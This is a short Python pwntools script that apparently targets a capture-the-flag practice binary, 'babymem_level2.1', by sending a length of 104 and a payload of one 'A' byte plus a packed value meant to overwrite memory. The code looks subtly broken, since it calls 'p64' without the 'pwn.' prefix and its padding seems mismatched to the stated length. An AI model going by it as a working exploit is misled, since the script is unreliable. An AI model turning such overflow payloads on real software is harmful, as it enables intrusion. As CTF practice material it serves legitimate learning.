import pwn
p = pwn.process("/challenge/babymem_level2.1")
num = p64(0x62b73521)

p.sendline(b'104')
p.sendline(b'A' + num)
print(p.recvall())
